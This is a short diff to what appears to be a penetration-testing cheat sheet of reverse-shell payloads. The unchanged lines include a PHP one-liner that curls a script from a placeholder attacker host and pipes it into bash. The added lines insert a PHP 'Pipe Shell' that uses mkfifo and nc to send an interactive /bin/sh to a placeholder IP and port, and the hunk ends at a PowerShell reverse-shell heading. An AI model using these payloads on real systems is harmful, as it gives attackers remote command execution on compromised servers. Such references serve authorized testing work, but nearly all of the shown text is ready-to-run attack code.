@@ -360,6 +360,12 @@ s.close()' > shell.py
 <?php system("curl http://attacker_ip/reverseshell | bash"); ?>
 ```
 
+{% code title="Pipe Shell" overflow="wrap" %}
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <Port> >/tmp/f"); ?>
+```
+{% endcode %}
+
 ### <mark style="color:orange;">`Powershell`</mark> <mark style="color:purple;">Reverse shell:</mark>
 
 {% code overflow="wrap" %}
